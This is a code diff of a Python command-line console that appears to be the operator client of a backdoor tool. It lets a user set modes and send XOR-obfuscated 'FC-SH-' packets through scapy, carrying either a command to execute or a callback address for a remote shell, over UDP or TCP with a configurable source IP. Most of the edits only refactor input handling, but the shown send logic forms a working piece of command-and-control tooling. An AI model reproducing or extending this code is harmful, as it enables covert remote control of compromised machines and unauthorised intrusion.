@@ -75,9 +75,6 @@ def main():
     ~ kindtime & jake
 
     """)
-# base params
-# cmd params
-# shell params
 
 
     # SQLCompleter = WordCompleter(['select', 'from', 'insert', 'update', 'delete', 'drop'],ignore_case=True)
@@ -100,24 +97,23 @@ def main():
         # click.echo_via_pager(user_input)
 
         if(len(user_in) > 1):
-            user_cmd = user_in[0]
-            if(user_cmd == "set"):
+            if(user_in[0] == "set"):
                 baseparams[user_in[1]] = user_in[2]
                 if user_in[1] == "mode":
                     if baseparams["mode"] == "shell":
                         shellPrompt()
                     elif baseparams["mode"] == "cmd":
                         cmdPrompt()
-            if(user_cmd == "show"):
-                if(user_in[1] == "all"):
-                    print(str(baseparams))
-                else:
-                    print(baseparams[user_in[1]])
+                    else:
+                        print("mode set incorrectly")
+                        baseparams["mode"] = ""
         elif len(user_in) == 1:
             if user_in[0] == "exit":
                 exit()
             elif user_in[0] == "help":
                 print_help()
+            elif user_in[0] == "show":
+                print_options(baseparams)
             else:
                 print_help()
         else:
@@ -131,15 +127,19 @@ def cmdPrompt():
                         auto_suggest=AutoSuggestFromHistory(),
                         # completer=SQLCompleter,
                         ).split()
-        
-        if user_in[0] == "exit":
-            return
-        elif user_in[0] == "options":
-            print_options(cmdparams)
-        elif user_in[0] == "send":
-            plaintext = "FC-SH-{}\00".format(shellparams["command"]) 
-            send(plaintext)
-        else:			
+
+        if len(user_in) == 1:
+            if user_in[0] == "exit":
+                return
+            elif user_in[0] == "options":
+                print_options(cmdparams)
+            elif user_in[0] == "send":
+                plaintext = "FC-SH-{}\00".format(shellparams["command"]) 
+                send(plaintext)
+            else:			
+                continue
+        else:
+            print("cmd help")
             continue
 
 
@@ -150,25 +150,30 @@ def shellPrompt():
                         auto_suggest=AutoSuggestFromHistory(),
                         # completer=SQLCompleter,
                         ).split()
-        
-        if user_in[0] == "exit":
-            return
-        elif user_in[0] == "options":
-            print_options(shellparams)
-            continue
-        elif user_in[0] == "send":
-            plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
-            send(plaintext) 
-        else:			
+
+        if len(user_in) == 1:
+            if user_in[0] == "exit":
+                return
+            elif user_in[0] == "options":
+                print_options(shellparams)
+                continue
+            elif user_in[0] == "send":
+                plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
+                send(plaintext) 
+            else:			
+                continue
+        else:
+            print("shell help")
             continue
 
 
 def send(plaintext):
     encrypted = xor_encrypt(plaintext.encode(), 0x10)
-    
+
     if(shellparams["transport"] == "udp"):
         scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
-        scapy.UDP(sport=shellparams["lport"], dport=shellparams["rport"])/encrypted)
+        scapy.UDP(sport=shellparams["lport"], dport=shellparams["rport"])/
+        encrypted)
     elif(shellparams["transport"] == "tcp"):
         scapy.send(scapy.IP(dst=shellparams["rhost"].encode(), src=shellparams["lhost"].encode())/
         scapy.TCP(sport=shellparams["lport"], dport=shellparams["rport"], flags="AP")/
